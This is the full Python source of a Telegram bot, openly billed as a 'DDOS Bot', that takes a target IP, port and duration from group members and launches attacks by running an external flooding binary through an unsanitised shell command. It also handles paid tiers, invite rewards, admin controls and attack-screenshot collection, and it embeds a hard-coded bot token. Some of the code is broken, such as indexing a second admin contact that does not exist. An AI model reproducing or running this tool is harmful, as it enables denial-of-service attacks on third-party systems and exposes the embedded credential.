#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading
import logging
import os
import signal

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
BOT_USERNAME = "@Bhai_ka_88_bot"
bot = telebot.TeleBot('7650135918:AAHRu19RMhRZFCTPAjiJ6RZJFk8peO6EcJE')
ADMIN_IDS = {"6155412817",}
CHANNEL_USERNAME = "@@AASHUMODZ"
FEEDBACK_CHANNEL = "@@AASHUFREEMODZ"
PAID_CHANNEL = "@@AASHUMODZ"
CONTACT_ADMINS = ["@AashuZodYt"]

# Constants
COOLDOWN_TIME = 0
ATTACK_LIMIT = 10
MAX_DURATION = 180
MUTE_DURATION = 86400

# Data storage
USER_FILE = "users.txt"
FEEDBACK_FILE = "feedback_photos.txt"
FEEDBACK_LOG_FILE = "feedback_log.txt"
GROUPS_FILE = "groups.txt"
APPROVED_GROUPS_FILE = "approved_groups.txt"
INVITE_FILE = "invites.txt"

# Global variables
user_data = {}
group_attacks = {}
pending_feedback = {}
active_attacks = {}
feedback_photo_ids = set()
group_ids = set()
approved_groups = set()
invite_data = {}  # {user_id: {invited_user_id: timestamp}}
ABUSE_WORDS = {"bsdk", "teri maa ki chut", "lund", "selling", "buy"}

# Random Image URLs
image_urls = [
    "https://envs.sh/g7a.jpg", "https://envs.sh/g7e.jpg", "https://envs.sh/g7i.jpg",
    "https://envs.sh/g7m.jpg", "https://envs.sh/g7q.jpg", "https://envs.sh/g7u.jpg",
    "https://envs.sh/g7y.jpg", "https://envs.sh/VwQ.jpg", "https://envs.sh/VwU.jpg",
    "https://envs.sh/VwY.jpg", "https://envs.sh/Vwc.jpg"
]

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

def load_feedback_photos():
    try:
        with open(FEEDBACK_FILE, "r") as file:
            for line in file:
                feedback_photo_ids.add(line.strip())
    except FileNotFoundError:
        pass

def save_feedback_photo(photo_id, user_id):
    timestamp = datetime.datetime.now().isoformat()
    with open(FEEDBACK_FILE, "a") as file:
        file.write(f"{photo_id}\n")
    with open(FEEDBACK_LOG_FILE, "a") as log_file:
        log_file.write(f"{timestamp},{user_id},{photo_id}\n")
    feedback_photo_ids.add(photo_id)

def reset_feedback_photos():
    global feedback_photo_ids
    feedback_photo_ids.clear()
    with open(FEEDBACK_FILE, "w") as file:
        file.truncate(0)

def load_groups():
    try:
        with open(GROUPS_FILE, "r") as file:
            for line in file:
                group_ids.add(line.strip())
    except FileNotFoundError:
        pass

def save_groups():
    with open(GROUPS_FILE, "w") as file:
        for group_id in group_ids:
            file.write(f"{group_id}\n")

def load_approved_groups():
    try:
        with open(APPROVED_GROUPS_FILE, "r") as file:
            for line in file:
                approved_groups.add(line.strip())
    except FileNotFoundError:
        pass

def save_approved_groups():
    with open(APPROVED_GROUPS_FILE, "w") as file:
        for group_id in approved_groups:
            file.write(f"{group_id}\n")

def load_invites():
    try:
        with open(INVITE_FILE, "r") as file:
            for line in file:
                user_id, invited_id, timestamp = line.strip().split(',')
                if user_id not in invite_data:
                    invite_data[user_id] = {}
                invite_data[user_id][invited_id] = datetime.datetime.fromisoformat(timestamp)
    except FileNotFoundError:
        pass

def save_invites():
    with open(INVITE_FILE, "w") as file:
        for user_id, invites in invite_data.items():
            for invited_id, timestamp in invites.items():
                file.write(f"{user_id},{invited_id},{timestamp.isoformat()}\n")

def is_user_in_both_channels(user_id):
    try:
        main_channel = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        feedback_channel = bot.get_chat_member(FEEDBACK_CHANNEL, user_id)
        return (main_channel.status in ['member', 'administrator', 'creator'] and 
                feedback_channel.status in ['member', 'administrator', 'creator'])
    except Exception as e:
        logger.error(f"Error checking channel membership for {user_id}: {e}")
        return False

def is_user_in_paid_channel(user_id):
    try:
        member = bot.get_chat_member(PAID_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking paid channel membership for {user_id}: {e}")
        return False

def contains_abuse(text):
    text_lower = text.lower()
    return any(abuse_word in text_lower for abuse_word in ABUSE_WORDS)

# Helper function to check if command is allowed in private chat
def check_private_chat(message, user_id):
    if message.chat.type == 'private' and user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Regular users can only use this bot in approved groups!")
        return False
    return True

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    command = message.text.replace(BOT_USERNAME, "").split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /setcooldown <seconds>")
        return
        
    try:
        new_cooldown = int(command[1])
        if new_cooldown < 0:
            bot.reply_to(message, "❌ Cooldown cannot be negative!")
            return
        global COOLDOWN_TIME
        COOLDOWN_TIME = new_cooldown
        bot.reply_to(message, f"✅ Cooldown set to {COOLDOWN_TIME} seconds!")
        logger.info(f"Cooldown set to {COOLDOWN_TIME} by {user_id}")
    except ValueError:
        bot.reply_to(message, "❌ Please provide a valid number of seconds!")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    if not user_data:
        bot.reply_to(message, "📋 No users registered yet!")
        return
        
    user_list = "\n".join([
        f"ID: {uid} | Attacks: {data['attacks']} | Last Reset: {data['last_reset'].strftime('%Y-%m-%d %H:%M:%S')}"
        for uid, data in user_data.items()
    ])
    if len(user_list) > 4000:
        parts = [user_list[i:i+4000] for i in range(0, len(user_list), 4000)]
        for part in parts:
            bot.reply_to(message, f"📋 Registered Users:\n{part}")
            time.sleep(0.5)
    else:
        bot.reply_to(message, f"📋 Registered Users:\n{user_list}")
    logger.info(f"User list viewed by {user_id}")

@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    
    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❌ Join both channels first!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
        return
        
    user_data.setdefault(user_id, {
        'attacks': 0,
        'last_reset': datetime.datetime.now(),
        'last_attack': None
    })
    
    last_attack = user_data[user_id]['last_attack']
    if COOLDOWN_TIME == 0:
        bot.reply_to(message, "✅ No cooldown set - ready to attack!")
    elif last_attack and (datetime.datetime.now() - last_attack).total_seconds() < COOLDOWN_TIME:
        remaining_time = int(COOLDOWN_TIME - (datetime.datetime.now() - last_attack).total_seconds())
        bot.reply_to(message, f"⏳ Cooldown active: {remaining_time} seconds remaining!")
    else:
        bot.reply_to(message, "✅ No cooldown active - ready to attack!")
    logger.info(f"Cooldown checked by {user_id}")

@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    
    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❌ Join both channels first!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
        return
        
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "👑 Admin: Unlimited attacks!")
        return
        
    user_data.setdefault(user_id, {
        'attacks': 0,
        'last_reset': datetime.datetime.now(),
        'last_attack': None
    })
    invite_count = len(invite_data.get(user_id, {}))
    user_attacks = user_data[user_id]['attacks']
    
    if user_attacks < ATTACK_LIMIT:
        remaining = ATTACK_LIMIT - user_attacks
        bot.reply_to(message, 
                     f"⚡ Remaining attacks: {remaining}/{ATTACK_LIMIT}\n"
                     f"ℹ️ Base limit: {ATTACK_LIMIT} | Invites available: {invite_count} (active after limit)")
    else:
        total_allowed_attacks = ATTACK_LIMIT + invite_count
        remaining = total_allowed_attacks - user_attacks
        bot.reply_to(message, 
                     f"⚡ Remaining attacks: {remaining}/{total_allowed_attacks}\n"
                     f"ℹ️ Base limit: {ATTACK_LIMIT} | Bonus from invites: {invite_count}")

@bot.message_handler(commands=['reset'])
def reset_user(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    command = message.text.replace(BOT_USERNAME, "").split()
    if len(command) < 2:
        bot.reply_to(message, "⚠️ Usage: /reset <user_id>")
        return
        
    target_id = command[1]
    if target_id in user_data:
        user_data[target_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None
        }
        save_users()
        bot.reply_to(message, f"✅ Attacks reset for user {target_id}")
        logger.info(f"User {target_id} reset by {user_id}")
    else:
        bot.reply_to(message, f"❌ User {target_id} not found!")

@bot.message_handler(commands=['addgroup'])
def handle_add_group(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 Use in groups only!")
        return
    
    group_id = str(message.chat.id)
    group_ids.add(group_id)
    save_groups()
    bot.reply_to(message, f"✅ Group {group_id} added for broadcasts!")
    logger.info(f"Group {group_id} added by {user_id}")

@bot.message_handler(commands=['approve'])
def handle_approve(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 Use in groups only!")
        return
    
    group_id = str(message.chat.id)
    if group_id in approved_groups:
        bot.reply_to(message, "✅ This group is already approved!")
        return
    
    approved_groups.add(group_id)
    save_approved_groups()
    bot.reply_to(message, f"✅ Group {group_id} has been approved to use the bot!")
    logger.info(f"Group {group_id} approved by {user_id}")

@bot.message_handler(commands=['disapprove'])
def handle_disapprove(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 Use in groups only!")
        return
    
    group_id = str(message.chat.id)
    if group_id not in approved_groups:
        bot.reply_to(message, "❌ This group is not approved!")
        return
    
    approved_groups.remove(group_id)
    save_approved_groups()
    bot.reply_to(message, f"✅ Group {group_id} has been disapproved and can no longer use the bot!")
    logger.info(f"Group {group_id} disapproved by {user_id}")

@bot.message_handler(commands=['broadcast'])
def handle_broadcast(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    command = message.text.replace(BOT_USERNAME, "").split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "⚠️ Usage: /broadcast <message>")
        return
    
    broadcast_msg = command[1]
    failed_groups = {}
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    formatted_msg = (
        "📢 **ADMIN BROADCAST ALERT** 📢\n"
        "═══════════════════════\n"
        f"🕒 Sent: {timestamp}\n"
        "👑 From: Admin Team\n"
        "═══════════════════════\n"
        f"💬 {broadcast_msg}\n"
        "═══════════════════════\n"
        "🔥 Join: @VIP_PAID_MOD\n"
        f"📞 Contact: {CONTACT_ADMINS[0]} or {CONTACT_ADMINS[1]}\n"
        "🌟 Stay active for updates!"
    )
    
    logger.info(f"Broadcast message content: {formatted_msg}")
    
    current_group_ids = group_ids.copy()
    logger.info(f"Attempting broadcast to groups: {list(current_group_ids)}")
    
    if not current_group_ids:
        bot.reply_to(message, "⚠️ No groups found to broadcast to!")
        return
    
    for group_id in current_group_ids:
        retries = 2
        success = False
        for attempt in range(retries):
            try:
                bot.send_message(group_id, formatted_msg, parse_mode='Markdown')
                success = True
                logger.info(f"Broadcast sent to {group_id}")
                time.sleep(1)
                break
            except telebot.apihelper.ApiTelegramException as e:
                if "can't parse entities" in str(e):
                    try:
                        bot.send_message(group_id, formatted_msg, parse_mode=None)
                        success = True
                        break
                    except Exception as fallback_e:
                        logger.error(f"Fallback failed for {group_id}: {fallback_e}")
                if attempt == retries - 1:
                    failed_groups[group_id] = str(e)
                time.sleep(2 ** attempt)
            except Exception as e:
                logger.error(f"Unexpected error for {group_id}: {e}")
                if attempt == retries - 1:
                    failed_groups[group_id] = str(e)
                time.sleep(2 ** attempt)
        
        if not success and group_id in group_ids:
            group_ids.remove(group_id)
            logger.warning(f"Removed invalid group ID: {group_id}")
    
    save_groups()
    response = "✅ Broadcast sent successfully!"
    if failed_groups:
        failed_list = "\n".join([f"Group {gid}: {reason}" for gid, reason in failed_groups.items()])
        response += f"\n⚠️ Failed to send to {len(failed_groups)} group(s):\n{failed_list}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['shutdown'])
def handle_shutdown(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    for group_id, process in list(active_attacks.items()):
        try:
            process.kill()
            time.sleep(0.5)
            if process.poll() is None:
                process.terminate()
            group_attacks[group_id] = False
            del active_attacks[group_id]
        except Exception as e:
            logger.error(f"Failed to stop attack in {group_id}: {e}")
    
    shutdown_msg = "🔴 **Bot Shutdown Notice**\nThe bot is shutting down now. Thank you for using our services!"
    for group_id in group_ids.copy():
        try:
            bot.send_message(group_id, shutdown_msg)
            time.sleep(0.5)
        except Exception as e:
            logger.error(f"Failed to send shutdown to {group_id}: {e}")
    
    bot.reply_to(message, "🔴 Bot shutting down... Shutdown notice sent!")
    save_users()
    save_groups()
    save_approved_groups()
    save_invites()
    bot.stop_bot()
    logger.info(f"Bot shutdown by {user_id}")
    raise SystemExit

@bot.message_handler(commands=['contact'])
def handle_contact(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    contact_text = f"""
📞 **Need Help or Want Premium Access?**  
🔥 Contact our admins:  
👤 {CONTACT_ADMINS[0]}  
👤 {CONTACT_ADMINS[1]}  
💎 DM to buy paid bot access for unlimited attacks!  
🌟 Join {PAID_CHANNEL} for premium features!
"""
    bot.reply_to(message, contact_text)

@bot.message_handler(commands=['help'])
def handle_help(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    help_text = """
🌟 **DDOS Bot Commands** 🌟
/attack <IP> <PORT> <TIME> - Start an attack (No time limit for admins)
/stop - [Admin] Stop ongoing attack
/check_cooldown - Check global cooldown
/check_remaining_attack - See remaining attacks
/checkinvite <user_id> - Add invite for +1 attack after limit
/contact - Get help or buy premium
/broadcast <message> - [Admin] Send message to all groups
/addgroup - [Admin] Add current group for broadcasts
/approve - [Admin] Approve group to use bot
/disapprove - [Admin] Remove group approval
/unban <user_id> - [Admin] Unban a user from current group
/reset <user_id> - [Admin] Reset user attacks
/setcooldown <seconds> - [Admin] Set cooldown
/viewusers - [Admin] View all users
/shutdown - [Admin] Stop the bot
📸 Send screenshot after attack as feedback
🔥 Join @VIP_PAID_MOD & @VIP_PAID_MOD to use!
💎 +1 attack per invite to @VIP_PAID_MOD after limit or buy unlimited from @bhanu_10m
"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    group_id = str(message.chat.id)
    is_admin = user_id in ADMIN_IDS
    command = message.text.split()

    if not check_private_chat(message, user_id):
        return

    if message.chat.type not in ['group', 'supergroup'] and not is_admin:
        bot.reply_to(message, "🚫 Use in approved groups only!")
        return

    if message.chat.type in ['group', 'supergroup'] and group_id not in approved_groups and not is_admin:
        bot.reply_to(message, "❌ This group is not approved to use the bot!\nContact an admin to get approval.")
        return

    group_ids.add(group_id)
    save_groups()

    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❗ Join both channels first!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
        return

    if not is_admin and pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 Send screenshot first!")
        return

    group_attacks.setdefault(group_id, False)
    if group_attacks[group_id]:
        bot.reply_to(message, "⚠️ Attack in progress in this group!")
        return
    
    group_attacks[group_id] = True

    if not is_admin:
        user_data.setdefault(user_id, {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None})
        user = user_data[user_id]
        invite_count = len(invite_data.get(user_id, {}))
        
        if user['attacks'] >= ATTACK_LIMIT:
            total_allowed_attacks = ATTACK_LIMIT + invite_count
            if user['attacks'] >= total_allowed_attacks:
                promotion_msg = (
                    f"❌ Attack limit reached ({user['attacks']}/{total_allowed_attacks})!\n"
                    f"💎 Join {PAID_CHANNEL} for unlimited attacks!\n"
                    f"📩 Invite more friends to {PAID_CHANNEL} for +1 attack per invite!\n"
                    f"🔥 DM {CONTACT_ADMINS[0]} or {CONTACT_ADMINS[1]} for premium access!\n"
                    f"ℹ️ Current invites: {invite_count}"
                )
                bot.reply_to(message, promotion_msg)
                group_attacks[group_id] = False
                return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <IP> <PORT> <TIME>")
        group_attacks[group_id] = False
        return

    target, port, time_duration = command[1], command[2], command[3]
    try:
        port = int(port)
        time_duration = int(time_duration)
        if not is_admin and time_duration > MAX_DURATION:
            bot.reply_to(message, f"🚫 Max duration for non-admins: {MAX_DURATION}s")
            group_attacks[group_id] = False
            return
        if time_duration <= 0:
            bot.reply_to(message, "❌ Duration must be positive!")
            group_attacks[group_id] = False
            return
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be integers!")
        group_attacks[group_id] = False
        return

    profile_photos = bot.get_user_profile_photos(user_id)
    profile_pic = profile_photos.photos[0][-1].file_id if profile_photos.total_count > 0 else None
    
    if not profile_pic:
        bot.reply_to(message, "❌ Set a profile picture!")
        group_attacks[group_id] = False
        return

    invite_count = len(invite_data.get(user_id, {}))
    total_allowed_attacks = ATTACK_LIMIT + (invite_count if user['attacks'] >= ATTACK_LIMIT else 0) if not is_admin else "Unlimited"
    remaining_attacks = (total_allowed_attacks - user['attacks'] - 1) if not is_admin else "Unlimited"
    
    attack_start_msg = (
        f"👤 User: @{user_name}\n"
        f"💥 Attack Started!\n"
        f"🎯 Target: {target}:{port}\n"
        f"⏳ Duration: {time_duration}s\n"
        f"⚡ Remaining: {remaining_attacks}"
    )
    if not is_admin:
        attack_start_msg += "\n📸 Send screenshot after attack as feedback"
    
    sent_message = bot.send_photo(message.chat.id, profile_pic, caption=attack_start_msg)
    logger.info(f"Attack started by {user_id} in {group_id}: {target}:{port} for {time_duration}s")

    if not is_admin:
        pending_feedback[user_id] = True

    def update_countdown(msg_id, chat_id, duration):
        remaining_time = duration
        while remaining_time >= 0 and group_attacks[group_id]:
            updated_msg = (
                f"👤 User: @{user_name}\n"
                f"💥 Attack Started!\n"
                f"🎯 Target: {target}:{port}\n"
                f"⏳ Duration: {remaining_time}s\n"
                f"⚡ Remaining: {remaining_attacks}"
            )
            if not is_admin:
                updated_msg += "\n📸 Send screenshot after attack as feedback"
            try:
                bot.edit_message_caption(chat_id=chat_id, message_id=msg_id, caption=updated_msg)
            except Exception as e:
                logger.error(f"Failed to update countdown: {e}")
                break
            time.sleep(1)
            remaining_time -= 1

    countdown_thread = threading.Thread(target=update_countdown, 
                                       args=(sent_message.message_id, message.chat.id, time_duration))
    countdown_thread.start()

    full_command = f"./Rohan {target} {port} {time_duration} 512 800"
    try:
        attack_process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
        active_attacks[group_id] = attack_process
        
        attack_process.wait()
        
        if group_attacks[group_id]:
            if not is_admin:
                user_data[user_id]['attacks'] += 1
                user_data[user_id]['last_attack'] = datetime.datetime.now()
                save_users()
                total_allowed_attacks = ATTACK_LIMIT + (invite_count if user_data[user_id]['attacks'] >= ATTACK_LIMIT else 0)
                remaining_attacks = total_allowed_attacks - user_data[user_id]['attacks']
            else:
                remaining_attacks = "Unlimited"
            
            bot.send_message(message.chat.id, 
                           f"✅ Attack Complete!\n🎯 {target}:{port}\n⏳ {time_duration}s\n⚡ Remaining: {remaining_attacks}")
            logger.info(f"Attack completed in {group_id}: {target}:{port}")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error: {e}")
        logger.error(f"Attack failed in {group_id}: {e}")
        if not is_admin:
            pending_feedback[user_id] = False
    finally:
        if group_id in active_attacks:
            del active_attacks[group_id]
        group_attacks[group_id] = False

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 Use in groups only!")
        return
    
    group_id = str(message.chat.id)
    if group_id not in active_attacks or not group_attacks.get(group_id, False):
        bot.reply_to(message, "❌ No active attack in this group!")
        return
    
    attack_process = active_attacks[group_id]
    try:
        os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
        attack_process.wait(timeout=1)
    except subprocess.TimeoutExpired:
        attack_process.kill()
    except Exception as e:
        logger.error(f"Error stopping attack in {group_id}: {e}")
        bot.reply_to(message, f"⚠️ Error stopping attack: {e}")
        return
    
    group_attacks[group_id] = False
    del active_attacks[group_id]
    
    bot.reply_to(message, "🛑 Attack stopped instantly by admin!")
    logger.info(f"Attack stopped instantly in {group_id} by {user_id}")

@bot.message_handler(commands=['unban'])
def handle_unban(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 Use in groups only!")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /unban <user_id>")
        return
    
    target_id = command[1]
    chat_id = message.chat.id
    
    try:
        member = bot.get_chat_member(chat_id, target_id)
        if member.status not in ['kicked', 'restricted']:
            bot.reply_to(message, f"❌ User {target_id} is not banned/restricted!")
            return
            
        bot.unban_chat_member(chat_id, target_id)
        bot.restrict_chat_member(
            chat_id,
            target_id,
            can_send_messages=True,
            can_send_media_messages=True,
            can_send_other_messages=True,
            can_add_web_page_previews=True
        )
        
        bot.reply_to(message, 
            f"✅ User {target_id} has been unbanned!\n"
            "🌟 They can now participate in the group again"
        )
        
        try:
            bot.send_message(
                target_id,
                f"🎉 Good news! You've been unbanned from chat {message.chat.title}\n"
                "Please follow the rules to avoid future bans!"
            )
        except:
            logger.warning(f"Could not notify user {target_id}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error unbanning user {target_id}: {str(e)}")

@bot.message_handler(commands=['checkinvite'])
def handle_check_invite(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "👑 Admins have unlimited attacks!")
        return

    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❗ Join both channels first!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
        return

    user_data.setdefault(user_id, {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None})
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /checkinvite <invited_user_id>")
        return

    invited_id = command[1]
    
    try:
        if not is_user_in_paid_channel(invited_id):
            bot.reply_to(message, f"❌ User {invited_id} is not in {PAID_CHANNEL}!")
            return
    except Exception:
        bot.reply_to(message, "❌ Invalid user ID or bot can't verify membership!")
        return

    if user_id not in invite_data:
        invite_data[user_id] = {}
    
    if invited_id in invite_data[user_id]:
        bot.reply_to(message, "❌ This user was already invited by you!")
        return

    invite_data[user_id][invited_id] = datetime.datetime.now()
    save_invites()
    
    invite_count = len(invite_data[user_id])
    user_attacks = user_data[user_id]['attacks']
    
    if user_attacks < ATTACK_LIMIT:
        bot.reply_to(message, 
                     f"✅ Invite recorded!\n"
                     f"👤 Invited user {invited_id} to {PAID_CHANNEL}\n"
                     f"ℹ️ +1 attack will be available after reaching base limit ({ATTACK_LIMIT})\n"
                     f"⚡ Current invites: {invite_count}")
    else:
        total_allowed_attacks = ATTACK_LIMIT + invite_count
        remaining_attacks = total_allowed_attacks - user_attacks
        bot.reply_to(message, 
                     f"✅ Invite verified!\n"
                     f"👤 Invited user {invited_id} to {PAID_CHANNEL}\n"
                     f"🎁 +1 attack added!\n"
                     f"⚡ Total allowed attacks: {total_allowed_attacks}\n"
                     f"⚡ Remaining attacks: {remaining_attacks}")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    if not check_private_chat(message, user_id):
        return
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "👑 Admin feedback not required!")
        return

    if not is_user_in_both_channels(user_id):
        bot.reply_to(message, f"❌ Join both channels first!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
        return

    if not pending_feedback.get(user_id, False):
        bot.reply_to(message, "❌ No pending feedback!")
        return

    photo_file_unique_id = message.photo[-1].file_unique_id
    user_data.setdefault(user_id, {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None})
    
    if photo_file_unique_id in feedback_photo_ids:
        user_data[user_id]['attacks'] = min(user_data[user_id]['attacks'] + 1, ATTACK_LIMIT + len(invite_data.get(user_id, {})))
        save_users()
        invite_count = len(invite_data.get(user_id, {}))
        total_allowed_attacks = ATTACK_LIMIT + (invite_count if user_data[user_id]['attacks'] >= ATTACK_LIMIT else 0)
        remaining_attacks = total_allowed_attacks - user_data[user_id]['attacks']
        warning_msg = (
            f"⚠️ **WARNING: Duplicate Screenshot Detected!**\n"
            f"📸 This photo was submitted before.\n"
            f"❌ 1 attack deducted as penalty.\n"
            f"⚡ Remaining attacks: {remaining_attacks}\n"
            f"ℹ️ Please submit a new screenshot next time!"
        )
        bot.reply_to(message, warning_msg)
        return

    pending_feedback[user_id] = False
    save_feedback_photo(photo_file_unique_id, user_id)
    
    bot.forward_message(FEEDBACK_CHANNEL, message.chat.id, message.message_id)
    bot.send_message(FEEDBACK_CHANNEL, 
                    f"📸 Feedback Received!\n👤 User: {user_name}\n🆔 ID: {user_id}\n📍 Group: {message.chat.title} ({message.chat.id})")
    
    invite_count = len(invite_data.get(user_id, {}))
    total_allowed_attacks = ATTACK_LIMIT + (invite_count if user_data[user_id]['attacks'] >= ATTACK_LIMIT else 0)
    remaining_attacks = total_allowed_attacks - user_data[user_id]['attacks']
    
    bot.reply_to(message, 
                 f"✅ Feedback accepted!\n"
                 f"📸 New screenshot verified.\n"
                 f"⚡ Next attack ready!\n"
                 f"ℹ️ Remaining attacks: {remaining_attacks}")

@bot.message_handler(func=lambda message: True)
def handle_abuse_detection(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    
    if user_id in ADMIN_IDS:
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        return
    
    if contains_abuse(message.text):
        try:
            bot.restrict_chat_member(
                chat_id, user_id, until_date=int(time.time()) + MUTE_DURATION,
                can_send_messages=False,
                can_send_media_messages=False,
                can_send_other_messages=False,
                can_add_web_page_previews=False
            )
            bot.kick_chat_member(chat_id, user_id)
            bot.reply_to(message, 
                        f"🚫 User @{message.from_user.username or user_id} has been muted for 24 hours and banned!\n"
                        f"Reason: Using abusive language")
            bot.delete_message(chat_id, message.message_id)
            logger.info(f"User {user_id} banned for abusive language in {chat_id}")
        except Exception as e:
            logger.error(f"Error banning user {user_id}: {e}")
            bot.reply_to(message, "⚠️ Abuse detected but failed to ban. Contact an admin!")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.from_user.id)
    if not check_private_chat(message, user_id):
        return
    user_name = message.from_user.first_name
    response = f"""
🌟🔥 **Welcome, {user_name}!** 🔥🌟
🚀 World's Best DDOS Bot!
⚡ Dominate the web!
🔗 Join: {CHANNEL_USERNAME}
💎 Premium: {PAID_CHANNEL}
📞 Help: {CONTACT_ADMINS[0]}, {CONTACT_ADMINS[1]}
"""
    bot.reply_to(message, response)

def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()
        reset_feedback_photos()
        logger.info("Midnight reset completed: Attacks and feedback photos cleared.")

reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

load_users()
load_feedback_photos()
load_groups()
load_approved_groups()
load_invites()

if __name__ == "__main__":
    logger.info("Bot starting...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(15)